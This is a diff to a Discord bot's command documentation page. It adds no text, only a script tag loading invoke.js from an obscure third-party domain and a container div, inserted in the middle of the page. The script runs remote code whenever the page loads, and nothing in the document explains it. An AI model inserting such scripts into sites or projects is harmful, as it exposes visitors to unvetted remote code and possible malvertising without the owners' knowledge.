@@ -10,6 +10,9 @@ tags:
 
 **{{bot_name}}** provides 2 different types of commands, namely `Message Commands` and `Application Commands`
 
+<script async="async" data-cfasync="false" src="//pl17523944.highperformancegate.com/86bde6f923ad7ce4a09df3fd7396a340/invoke.js"></script>
+<div id="container-86bde6f923ad7ce4a09df3fd7396a340"></div>
+
 ## Message Commands
 These types of commands can easily typing `[prefix]command_name sub_command_name` in discord [See the GIF below]
 
